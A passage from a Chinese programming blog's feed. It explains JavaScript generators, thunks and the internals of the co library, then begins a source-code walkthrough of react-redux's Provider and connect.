<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">XXX(arg1, arg2, ... , argN, <span class="function"><span class="keyword">function</span>(<span class="params">err, res</span>) </span>&#123;</div><div class="line">   ...</div><div class="line">&#125;);</div></pre></td></tr></table></figure>
<p>直接在yield后面写这样的函数是丝毫没有作用的，异步依旧是异步。我们所需要做的是将callback返回给next().value，能从中获取异步结果，传给下一个next，这样yield的返回值也就拿到了异步的结果，此时，异步就不知不觉变同步了。</p>
<p>正如上面的readFile的示例一样，我们期望把一般的callback函数转化为以callback为单参数的函数，这就是thunk化。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>);</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">thunk</span>(<span class="params">fn</span>) </span>&#123;</div><div class="line">  <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="keyword">var</span> args = <span class="built_in">arguments</span>;</div><div class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params">callback</span>) </span>&#123;</div><div class="line">      <span class="keyword">var</span> callbackOption = <span class="function"><span class="keyword">function</span>(<span class="params">err, data</span>) </span>&#123;</div><div class="line">        callback(err, data.toString());</div><div class="line">      &#125;</div><div class="line">      fn.apply(<span class="literal">null</span>, [...Array.prototype.slice.call(args), callbackOption]);</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">var</span> readFile = thunk(fs.readFile);</div><div class="line"></div><div class="line"><span class="keyword">var</span> gen = <span class="function"><span class="keyword">function</span>*(<span class="params"></span>) </span>&#123;</div><div class="line">  <span class="keyword">var</span> res1 = <span class="keyword">yield</span> readFile(<span class="string">'1.txt'</span>);</div><div class="line">  <span class="built_in">console</span>.log(res1);</div><div class="line">  <span class="keyword">var</span> res2 = <span class="keyword">yield</span> readFile(<span class="string">'2.txt'</span>);</div><div class="line">  <span class="built_in">console</span>.log(res2);</div><div class="line">  <span class="keyword">return</span> <span class="string">'test3'</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">var</span> g = gen();</div><div class="line"></div><div class="line">g.next().value(<span class="function"><span class="keyword">function</span>(<span class="params">err, res</span>) </span>&#123;</div><div class="line">  g.next(res).value(<span class="function"><span class="keyword">function</span>(<span class="params">err, res</span>) </span>&#123;</div><div class="line">    <span class="built_in">console</span>.log(g.next(res));</div><div class="line">  &#125;);</div><div class="line">&#125;);</div></pre></td></tr></table></figure>
<p>这里自己写了一个简易实现，更详细的实现可参见<a href="https://github.com/tj/node-thunkify/blob/master/index.js" target="_blank" rel="external">node-thunkify源码</a></p>
<p><strong>yield Promise</strong></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">const</span> REACT_URL = <span class="string">'https://www.reddit.com/r/reactjs.json'</span>;</div><div class="line"><span class="keyword">const</span> FRONTEND_URL = <span class="string">'https://www.reddit.com/r/frontend.json'</span>;</div><div class="line"></div><div class="line"><span class="keyword">const</span> request = <span class="function"><span class="keyword">function</span>(<span class="params">url</span>) </span>&#123;</div><div class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span> (<span class="params">resolve, reject</span>) </span>&#123;</div><div class="line">    fetch(url)</div><div class="line">    .then(response =&gt; response.json())</div><div class="line">    .then(json =&gt; resolve(json))</div><div class="line">  &#125;);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">const</span> gen = <span class="function"><span class="keyword">function</span>* (<span class="params"></span>)</span>&#123;</div><div class="line">  <span class="keyword">const</span> res1 = <span class="keyword">yield</span> request(REACT_URL);</div><div class="line">  <span class="built_in">console</span>.log(res1);</div><div class="line">  <span class="keyword">const</span> res2 = <span class="keyword">yield</span> request(FRONTEND_URL);</div><div class="line">  <span class="built_in">console</span>.log(res2);</div><div class="line">&#125;;</div><div class="line"></div><div class="line"><span class="keyword">const</span> g = gen();</div><div class="line"></div><div class="line">g.next().value.then(<span class="function"><span class="keyword">function</span>(<span class="params">data</span>) </span>&#123;</div><div class="line">  g.next(data).value.then(<span class="function"><span class="keyword">function</span>(<span class="params">data</span>) </span>&#123;</div><div class="line">    g.next(data);</div><div class="line">  &#125;);</div><div class="line">&#125;);</div></pre></td></tr></table></figure>
<p>promise与callback异曲同工，返回一个promise作为value的值，通过reslove获取到异步结果，传给下一个next。</p>
<p><strong>yield generator</strong></p>
<p>利用yield*，来执行generator内嵌的generator</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">const</span> REACT_URL = <span class="string">'https://www.reddit.com/r/reactjs.json'</span>;</div><div class="line"><span class="keyword">const</span> FRONTEND_URL = <span class="string">'https://www.reddit.com/r/frontend.json'</span>;</div><div class="line"></div><div class="line"><span class="keyword">const</span> request = <span class="function"><span class="keyword">function</span>(<span class="params">url</span>) </span>&#123;</div><div class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span> (<span class="params">resolve, reject</span>) </span>&#123;</div><div class="line">    fetch(url)</div><div class="line">    .then(response =&gt; response.json())</div><div class="line">    .then(json =&gt; resolve(json))</div><div class="line">  &#125;);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">const</span> gen2 = <span class="function"><span class="keyword">function</span>* (<span class="params"></span>)</span>&#123;</div><div class="line">  <span class="keyword">return</span> [</div><div class="line">    <span class="keyword">yield</span> request(REACT_URL),</div><div class="line">    <span class="keyword">yield</span> request(FRONTEND_URL),</div><div class="line">  ];</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">const</span> gen = <span class="function"><span class="keyword">function</span>* (<span class="params"></span>)</span>&#123;</div><div class="line">  <span class="keyword">const</span> res = <span class="keyword">yield</span>* gen2();</div><div class="line">  <span class="built_in">console</span>.log(res);</div><div class="line">&#125;;</div><div class="line"></div><div class="line"><span class="keyword">const</span> g = gen();</div><div class="line"></div><div class="line">g.next().value.then(<span class="function"><span class="keyword">function</span>(<span class="params">data</span>) </span>&#123;</div><div class="line">  g.next(data).value.then(<span class="function"><span class="keyword">function</span>(<span class="params">data</span>) </span>&#123;</div><div class="line">    g.next(data);</div><div class="line">  &#125;);</div><div class="line">&#125;);</div></pre></td></tr></table></figure>
<p><strong>yield 数组</strong></p>
<p>对于数组而言，会并行执行，等待数组中的所有成员均执行完后，在value中返回包含所有结果的数组。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">const</span> REACT_URL = <span class="string">'https://www.reddit.com/r/reactjs.json'</span>;</div><div class="line"><span class="keyword">const</span> FRONTEND_URL = <span class="string">'https://www.reddit.com/r/frontend.json'</span>;</div><div class="line"></div><div class="line"><span class="keyword">const</span> request = <span class="function"><span class="keyword">function</span>(<span class="params">url</span>) </span>&#123;</div><div class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span> (<span class="params">resolve, reject</span>) </span>&#123;</div><div class="line">    fetch(url)</div><div class="line">    .then(response =&gt; response.json())</div><div class="line">    .then(json =&gt; resolve(json))</div><div class="line">  &#125;);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">const</span> gen = <span class="function"><span class="keyword">function</span>* (<span class="params"></span>)</span>&#123;</div><div class="line">  <span class="keyword">const</span> res = <span class="keyword">yield</span> [</div><div class="line">    request(REACT_URL),</div><div class="line">    request(FRONTEND_URL),</div><div class="line">  ];</div><div class="line">&#125;;</div><div class="line"></div><div class="line"><span class="keyword">const</span> g = gen();</div><div class="line"></div><div class="line"><span class="built_in">console</span>.log(g.next()); <span class="comment">// &#123; value: [Promise, Promise], done: false &#125;</span></div></pre></td></tr></table></figure>
<h2 id="co的实现"><a href="#co的实现" class="headerlink" title="co的实现"></a>co的实现</h2><p>co的本质其实就是对于g.next()的执行和结果传递，yield后面会跟各种不同的数据结构(如: Promise、数组、对象、thunk函数等等)，不同的数据结构对于g.next()的执行略微有些区别，co对这个过程进行了封装，让我们能专注于generator函数内部的逻辑编写。</p>
<p>co只接受一个参数，可能是generator function，即<code>function* ()</code>，gen.apply执行，可能是generator，即<code>function *()()</code>，执行指针，通过gen.next()判断。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">co</span>(<span class="params">gen</span>) </span>&#123;</div><div class="line">  <span class="keyword">var</span> ctx = <span class="keyword">this</span>;</div><div class="line">  <span class="keyword">var</span> args = slice.call(<span class="built_in">arguments</span>, <span class="number">1</span>);</div><div class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span>(<span class="params">resolve, reject</span>) </span>&#123;</div><div class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> gen === <span class="string">'function'</span>) gen = gen.apply(ctx, args);</div><div class="line">    <span class="keyword">if</span> (!gen || <span class="keyword">typeof</span> gen.next !== <span class="string">'function'</span>) <span class="keyword">return</span> resolve(gen);</div><div class="line">    ...</div><div class="line">  &#125;</div><div class="line"> &#125;</div></pre></td></tr></table></figure>
<p>控制generator执行部分，核心思想在于将gen.next的返回结果，传给next函数，首先判断若done为true，则结束整个generator，执行返回promise的resolve，传入最后的value值。若为false，对value值promise化，无论value是什么。value.then注入onFulfilled与onRejected，来执行下一次gen.next。</p>
<p>在generator中，一遇到错误就会通过返回的promise的reject对外抛出异常。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line">onFulfilled();</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">onFulfilled</span>(<span class="params">res</span>) </span>&#123;</div><div class="line">  <span class="keyword">var</span> ret;</div><div class="line">  <span class="keyword">try</span> &#123;</div><div class="line">    ret = gen.next(res);</div><div class="line">  &#125; <span class="keyword">catch</span> (e) &#123;</div><div class="line">    <span class="keyword">return</span> reject(e);</div><div class="line">  &#125;</div><div class="line">  next(ret);</div><div class="line">  <span class="keyword">return</span> <span class="literal">null</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">onRejected</span>(<span class="params">err</span>) </span>&#123;</div><div class="line">  <span class="keyword">var</span> ret;</div><div class="line">  <span class="keyword">try</span> &#123;</div><div class="line">    ret = gen.throw(err);</div><div class="line">  &#125; <span class="keyword">catch</span> (e) &#123;</div><div class="line">    <span class="keyword">return</span> reject(e);</div><div class="line">  &#125;</div><div class="line">  next(ret);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">next</span>(<span class="params">ret</span>) </span>&#123;</div><div class="line">  <span class="keyword">if</span> (ret.done) <span class="keyword">return</span> resolve(ret.value);</div><div class="line">  <span class="keyword">var</span> value = toPromise.call(ctx, ret.value);</div><div class="line">  <span class="keyword">if</span> (value &amp;&amp; isPromise(value)) <span class="keyword">return</span> value.then(onFulfilled, onRejected);</div><div class="line">  <span class="keyword">return</span> onRejected(...);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>co最核心的地方就在于value的promise化，使yield后表达式返回值传递得到统一。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">toPromise</span>(<span class="params">obj</span>) </span>&#123;</div><div class="line">  <span class="keyword">if</span> (!obj) <span class="keyword">return</span> obj;</div><div class="line">  <span class="keyword">if</span> (isPromise(obj)) <span class="keyword">return</span> obj;</div><div class="line">  <span class="keyword">if</span> (isGeneratorFunction(obj) || isGenerator(obj)) <span class="keyword">return</span> co.call(<span class="keyword">this</span>, obj);</div><div class="line">  </div><div class="line">  <span class="keyword">if</span> (<span class="string">'function'</span> == <span class="keyword">typeof</span> obj) <span class="keyword">return</span> thunkToPromise.call(<span class="keyword">this</span>, obj);</div><div class="line"></div><div class="line">  <span class="keyword">if</span> (<span class="built_in">Array</span>.isArray(obj)) <span class="keyword">return</span> arrayToPromise.call(<span class="keyword">this</span>, obj);</div><div class="line"></div><div class="line">  <span class="keyword">if</span> (isObject(obj)) <span class="keyword">return</span> objectToPromise.call(<span class="keyword">this</span>, obj);</div><div class="line">  <span class="keyword">return</span> obj;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>前三个都比较简单，如果obj未定义，返回undefined，如果本身就是promise，就不需要再转化了，如果是generator或是generator function，那么就在co的内部再执行co，这里可以关注一下是如何判断generator和generator function的。</p>
<p>对于co，我们必须使用thunk化后的function，我们只允许其有一个参数callback，但允许callback有多个参数，但第一个必须为error。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">thunkToPromise</span>(<span class="params">fn</span>) </span>&#123;</div><div class="line">  <span class="keyword">var</span> ctx = <span class="keyword">this</span>;</div><div class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span> (<span class="params">resolve, reject</span>) </span>&#123;</div><div class="line">    fn.call(ctx, <span class="function"><span class="keyword">function</span> (<span class="params">err, res</span>) </span>&#123;</div><div class="line">      <span class="keyword">if</span> (err) <span class="keyword">return</span> reject(err);</div><div class="line">      <span class="keyword">if</span> (<span class="built_in">arguments</span>.length &gt; <span class="number">2</span>) res = slice.call(<span class="built_in">arguments</span>, <span class="number">1</span>);</div><div class="line">      resolve(res);</div><div class="line">    &#125;);</div><div class="line">  &#125;);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>将数组中的所有值均promise化后执行，Promise.all会等待数组内所有promise均fulfilled、或者有一个rejected，才会执行其后的then。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">arrayToPromise</span>(<span class="params">obj</span>) </span>&#123;</div><div class="line">  <span class="keyword">return</span> <span class="built_in">Promise</span>.all(obj.map(toPromise, <span class="keyword">this</span>));</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>注意在数组和对象中是可以出现一些普通值的，比如数字、对象等等，它们不会被toPromise promise化。</p>
<p>对象与数组也有相似之处，对象通过key进行遍历，对于每个被promise化好的value，都将其存储于promises中，最后Promise.all，生成results。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">objectToPromise</span>(<span class="params">obj</span>)</span>&#123;</div><div class="line">  <span class="keyword">var</span> results = <span class="keyword">new</span> obj.constructor();</div><div class="line">  <span class="keyword">var</span> keys = <span class="built_in">Object</span>.keys(obj);</div><div class="line">  <span class="keyword">var</span> promises = [];</div><div class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; keys.length; i++) &#123;</div><div class="line">    <span class="keyword">var</span> key = keys[i];</div><div class="line">    <span class="keyword">var</span> promise = toPromise.call(<span class="keyword">this</span>, obj[key]);</div><div class="line">    <span class="keyword">if</span> (promise &amp;&amp; isPromise(promise)) defer(promise, key);</div><div class="line">    <span class="keyword">else</span> results[key] = obj[key];</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">return</span> <span class="built_in">Promise</span>.all(promises).then(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="keyword">return</span> results;</div><div class="line">  &#125;);</div><div class="line"></div><div class="line">  <span class="function"><span class="keyword">function</span> <span class="title">defer</span>(<span class="params">promise, key</span>) </span>&#123;</div><div class="line">    <span class="comment">// predefine the key in the result</span></div><div class="line">    results[key] = <span class="literal">undefined</span>;</div><div class="line">    promises.push(promise.then(<span class="function"><span class="keyword">function</span> (<span class="params">res</span>) </span>&#123;</div><div class="line">      results[key] = res;</div><div class="line">    &#125;));</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>最后讲讲co.wrap，co.wrap主要是将co转变为一个返回promise的普通函数，可用于抽象，同时避免相同的co创建新的闭包。有一点切勿混淆，无论是co还是co.wrap, <code>function* ()</code>都是可以传入参数的。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">co.wrap = <span class="function"><span class="keyword">function</span> (<span class="params">fn</span>) </span>&#123;</div><div class="line">  <span class="comment">// 只是保存generatorFunction的引用</span></div><div class="line">  createPromise.__generatorFunction__ = fn;</div><div class="line">  <span class="keyword">return</span> createPromise;</div><div class="line">  <span class="function"><span class="keyword">function</span> <span class="title">createPromise</span>(<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="comment">// createPromise的arguments</span></div><div class="line">    <span class="keyword">return</span> co.call(<span class="keyword">this</span>, fn.apply(<span class="keyword">this</span>, <span class="built_in">arguments</span>));</div><div class="line">  &#125;</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<p>最近也在看<code>redux-saga</code>和<code>Koa</code>，它们就是基于generator的，等学习完后再进行总结和归纳。</p>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="http://es6.ruanyifeng.com/#docs/generator" target="_blank" rel="external">ECMAScript6入门-generator</a></p>
<p><a href="http://es6.ruanyifeng.com/#docs/async" target="_blank" rel="external">ECMAScript6入门-异步操作</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;初识generator&quot;&gt;&lt;a href=&quot;#初识generator&quot; class=&quot;headerlink&quot; title=&quot;初识generator&quot;&gt;&lt;/a&gt;初识generator&lt;/h2&gt;&lt;p&gt;&lt;code&gt;generator&lt;/code&gt;是ES6的新特性，也是一种异步编程的解决方案。generator函数通过&lt;code&gt;function*()&lt;/code&gt;来表示，它相当于一个状态机，在内部通过yield来标识每一个状态。generator函数的返回值是一个指向内部状态的指针，我们将它命名为指针g。&lt;/p&gt;
&lt;p&gt;在generator函数内部，凡是遇到yield标记的语句都会被阻塞。它们的控制权完全交给指针g，当指针g执行next时，相当于恢复generator的执行，相应的，next操作会返回一个包含value和done的对象。若当前generator执行完成，也就是之后没有yield语句了，value返回undefind，done返回true，告诉next执行完成。如果后面会被阻塞，则done返回false，value则为yield后面语句的值。next可被传入值，所传入的值将作为yield的返回值。具体执行流程可见下图:&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/images/23-1.jpg&quot; alt=&quot;generator&quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;注意一种特殊情况:&lt;/strong&gt; 当generator函数内部有return时，返回&lt;code&gt;{ value: return值, done: true }&lt;/code&gt;，结束generator的执行。&lt;/p&gt;
    
    </summary>
    
      <category term="前端基本功" scheme="http://blackganglion.com/categories/%E5%89%8D%E7%AB%AF%E5%9F%BA%E6%9C%AC%E5%8A%9F/"/>
    
    
      <category term="异步" scheme="http://blackganglion.com/tags/%E5%BC%82%E6%AD%A5/"/>
    
  </entry>
  
  <entry>
    <title>Connect Redux And React</title>
    <link href="http://blackganglion.com/2016/07/17/Connect-Redux-And-React/"/>
    <id>http://blackganglion.com/2016/07/17/Connect-Redux-And-React/</id>
    <published>2016-07-16T16:58:57.000Z</published>
    <updated>2016-07-16T17:01:18.000Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/images/22-1.jpg" alt="ReduxAndReact" width="65%"></p>
<blockquote>
<p>From the very beginning, we need to stress that Redux has no relation to React. You can write Redux apps with React, Angular, Ember, jQuery, or vanilla JavaScript.</p>
</blockquote>
<p>我们经常将redux与react两者放在一起谈论，但实际上Redux与React并没有直接关联，也没有相互依赖的。Redux本质上是一个状态容器，给予开发者维护状态的能力，而这恰恰是React的薄弱环节。</p>
<p>在仅有React的开发中，我们不得不将组件的状态存入state中，子组件需要通过父组件给予的回调函数修改父组件的state，父组件需要把状态通过props传递给子组件。两个组件间需要通信(也可以理解为两个组件需要相互修改状态)，就需要将state存储在他们共有的父组件中。随着应用越来越复杂，父组件的state越来越大，传给子组件的props也越来越复杂(即包含数据, 又有回调函数)。</p>
<p>此时Redux出现了，Redux单一数据流的思想和react是不谋而合的。我们可以将整个父组件的state放入Redux的store中进行维护。但我们在本文开头提到过，Redux与React之间是没有关联的，那么如何将Redux与React串联起来呢? 我们使用了<a href="https://github.com/reactjs/react-redux" target="_blank" rel="external">react-redux</a>。</p>
<a id="more"></a>
<h2 id="本质"><a href="#本质" class="headerlink" title="本质"></a>本质</h2><p>首先我们先思考一下，我们期望react-redux做一些什么事情?</p>
<p>毫无疑问，一定是构建起Redux与React的桥梁，我们将React中的state提升到Redux的store中，期望在React的view层中能够触发改变Redux store的操作，就像原来的setState一样，我们也期望React组件能够感应到store的change，完成view的重绘。</p>
<p>react-redux也就是这样做的，它非常简洁，仅仅对外暴露了两个API，<code>&lt;Provider store&gt;</code>与<code>connect([mapStateToProps], [mapDispatchToProps], [mergeProps], [options])</code>，API其实非常清晰地给予了顶层组件与子组件的connect方式，如下图：</p>
<p><img src="/images/22-2.png" alt="redux-react"></p>
<h2 id="Provider"><a href="#Provider" class="headerlink" title="Provider"></a>Provider</h2><p>Provider的作用就在于获取props中的store，将store存储于context中(源码注释1-1)，这样所有的后代元素均可以获取到顶层的store，摆脱了父子元素间props的传递。注意，Provider只能包含一个子元素(源码注释1-2)，正如上图所示一样，只有一个<code>Root Component</code>。</p>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Provider</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</div><div class="line">  getChildContext() &#123;</div><div class="line">    <span class="comment">// 源码注释1-1</span></div><div class="line">    <span class="keyword">return</span> &#123; store: <span class="keyword">this</span>.store &#125;</div><div class="line">  &#125;</div><div class="line"></div><div class="line">  <span class="keyword">constructor</span>(props, context) &#123;</div><div class="line">    <span class="keyword">super</span>(props, context)</div><div class="line">    <span class="keyword">this</span>.store = props.store</div><div class="line">  &#125;</div><div class="line"></div><div class="line">  render() &#123;</div><div class="line">    <span class="comment">// 源码注释1-2</span></div><div class="line">    <span class="keyword">return</span> Children.only(<span class="keyword">this</span>.props.children)</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h2 id="Connect"><a href="#Connect" class="headerlink" title="Connect"></a>Connect</h2><p>对于一个组件而言, 我们不仅仅需要store的state中所存储的数据，需要获得父组件的props，父组件的props可能是一些数据，也可能是一些配置，也需要获得能够触发store中state改变的action。</p>
<p>那connect内部究竟是怎么实现的呢？让我们看一下源码：</p>
<h3 id="connect参数"><a href="#connect参数" class="headerlink" title="connect参数"></a>connect参数</h3><figure class="highlight jsx"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">const</span> defaultMapStateToProps = state =&gt; (&#123;&#125;)</div><div class="line"><span class="keyword">const</span> defaultMapDispatchToProps = dispatch =&gt; (&#123; dispatch &#125;)</div><div class="line"><span class="keyword">const</span> defaultMergeProps = (stateProps, dispatchProps, parentProps) =&gt; (&#123;</div><div class="line">  ...parentProps,</div><div class="line">  ...stateProps,</div><div class="line">  ...dispatchProps</div><div class="line">&#125;)</div><div class="line"></div><div class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="function"><span class="keyword">function</span> <span class="title">connect</span>(<span class="params">mapStateToProps, mapDispatchToProps, mergeProps, options = &#123;&#125;</span>) </span>&#123;</div><div class="line">  <span class="comment">// 源码注释2-1</span></div><div class="line">  <span class="keyword">const</span> shouldSubscribe = <span class="built_in">Boolean</span>(mapStateToProps)</div><div class="line">  <span class="keyword">const</span> mapState = mapStateToProps || defaultMapStateToProps</div><div class="line">  </div><div class="line">  <span class="comment">// 源码注释2-2</span></div><div class="line">  <span class="keyword">let</span> mapDispatch</div><div class="line">  <span class="keyword">if</span> (<span class="keyword">typeof</span> mapDispatchToProps === <span class="string">'function'</span>) &#123;</div><div class="line">    mapDispatch = mapDispatchToProps</div><div class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!mapDispatchToProps) &#123;</div><div class="line">    mapDispatch = defaultMapDispatchToProps</div><div class="line">  &#125; <span class="keyword">else</span> &#123;</div><div class="line">    mapDispatch = wrapActionCreators(mapDispatchToProps)</div><div class="line">  &#125;</div><div class="line">  </div><div class="line">  <span class="comment">// 源码注释2-3</span></div><div class="line">  <span class="keyword">const</span> finalMergeProps = mergeProps || defaultMergeProps</div><div class="line">  </div><div class="line">  <span class="comment">// 源码注释2-4</span></div><div class="line">  <span class="keyword">const</span> &#123; pure = <span class="literal">true</span>, withRef = <span class="literal">false</span> &#125; = options</div><div class="line">  <span class="keyword">const</span> checkMergedEquals = pure &amp;&amp; finalMergeProps !== defaultMergeProps</div><div class="line"></div><div class="line">  <span class="keyword">return</span> <span class="function"><span class="keyword">function</span> <span 